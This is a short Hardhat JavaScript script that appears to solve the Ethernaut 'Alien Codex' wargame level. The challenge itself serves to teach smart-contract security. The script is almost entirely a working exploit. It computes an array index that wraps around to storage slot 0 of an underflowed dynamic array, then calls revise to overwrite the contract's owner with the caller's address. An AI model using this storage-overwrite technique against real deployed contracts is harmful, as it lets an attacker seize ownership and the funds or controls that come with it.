const { ethers } = require("hardhat");
const { BigNumber } = require("ethers");
const Runner = require("./lib/runner");

async function setContractOwner(contract, newOwnerAddr) {
    //this is the storage slot where the first of the array values are stored
    const arrayStorageSlot = ethers.utils.solidityKeccak256(["uint256"], [1]);

    //this array index will wrap back around to zero
    const arrayIndex = ethers.constants.MaxUint256.sub(BigNumber.from(arrayStorageSlot)).add(1);

    //create a whole new value for storage slot 0
    let bytes = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1];
    bytes = bytes.concat(Array.from(ethers.utils.arrayify(newOwnerAddr)));

    //set storage slot zero and verify owner
    
    console.log(bytes); 
    console.log(arrayIndex);
    await contract.revise(arrayIndex, bytes);
}

Runner.run(async (provider, owner) => { 
    
    //PLACE THE ALIEN CODEX CONTRACT ADDRESS HERE (Ethernaut: contract.address) 
    const contractAddr = "0x786eF9502B1a1F8B9eCF3D185e183175d836CbaC"; 
    
    const contract = await ethers.getContractAt("AlienCodex", contractAddr); 

    console.log("* * * ");
    console.log("setting owner...."); 
    
    console.log("contract owner: ", await contract.owner()); 

    //make initial contact
    //await contract.make_contact();

    //underflow the array to prepare it
    //await contract.retract();
    
    //set new owner
    await setContractOwner(contract, owner.address); 
    
    console.log("contract owner: ", await contract.owner()); 
});
